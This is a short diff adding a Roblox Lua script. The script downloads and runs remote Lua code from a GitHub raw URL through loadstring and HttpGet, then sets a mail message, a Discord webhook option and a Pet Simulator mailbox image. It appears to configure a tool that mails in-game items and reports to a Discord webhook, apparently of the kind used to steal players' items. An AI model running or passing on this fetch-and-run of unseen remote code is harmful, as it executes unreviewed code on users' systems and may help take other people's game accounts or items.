@@ -1,0 +1,6 @@
+local Moontech = loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/API/main/Api.lua", true))()
+
+Moontech.Mailmessage = "..." -- anything you want.
+
+Moontech.Discord_Webhook = true
+Moontech.images = "https://images-ext-1.discordapp.net/external/YCMOqf6nUlo0TZwXNN_v7JHbfKXYsoeHz2XTgCD0Je4/%3Fcb%3D20240114132246/https/static.wikia.nocookie.net/pet-simulator/images/8/88/Mailbox-Release.png/revision/latest?format=webp" -- discord webhook profile
